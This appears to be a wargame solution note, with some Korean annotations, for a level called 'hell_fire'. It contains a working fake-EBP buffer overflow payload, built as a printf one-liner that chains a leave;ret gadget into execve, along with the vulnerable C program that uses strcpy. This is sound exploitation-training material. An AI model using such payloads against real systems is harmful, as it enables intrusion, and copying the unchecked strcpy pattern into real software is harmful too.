1. fake EBP
	- RTL + arg, ...
	- shellcode(메모리 권한 변경)

fgets buffer:
execl: 0x7a5720
/bin/my-pass:
leave&ret: 0x8048561 \x61\x85\x04\x08
stdin: 0x8049788
fgets buffer: 0xf6ffe000
fgets buffer + 268 + 92: 0xfbffe16c
execve: 0x7a5490

<fake ebp>
	echo -n "$(for x in `seq 1 268`; do printf "A"; done)$(printf "\x61\x85\x04\x08")$(for x in `seq 1 88`; do printf "a"; done)$(printf "\x6c\xe1\xff\xf6")$(printf "\x61\x85\x04\x08")$(printf "aaaa")$(printf "\x90\x54\x7a\x00")$(printf "\x8c\xe1\xff\xf6")$(printf "\x84\xe1\xff\xf6")$(printf "\x00\x00\x00\x00")$(printf "\x8c\xe1\xff\xf6")$(printf "\x00\x00\x00\x00")$(printf "/bin/my-pass\x00")"| ./hell_fire
</fake ebp>

#include <stdio.h>

int main()
{
        char buffer[256];
        char saved_sfp[4];
        char temp[1024];

        printf("hell_fire : What's this smell?\n");
        printf("you : ");
        fflush(stdout);

        // give me a food
        fgets(temp, 1024, stdin);

        // save sfp 
        memcpy(saved_sfp, buffer+264, 4);

        // overflow!!
        strcpy(buffer, temp);

        // restore sfp 
        memcpy(buffer+264, saved_sfp, 4);

        printf("%s\n", buffer);
}

